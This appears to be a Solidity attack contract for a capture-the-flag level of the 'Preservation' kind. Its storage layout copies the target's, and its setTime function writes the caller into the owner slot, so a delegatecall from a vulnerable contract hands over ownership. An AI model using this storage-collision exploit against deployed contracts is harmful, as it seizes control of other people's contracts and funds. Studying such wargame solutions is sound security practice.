contract PreservationAttack {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;

  function setTime(uint _time) public {
    owner = msg.sender;
  }

  function getUintFromAddress(address _addr) public view returns(uint) {
    return uint(_addr);
  }

  function getAddressFromUint(uint _uint) public view returns(address){
      return address(_uint);
  }
}
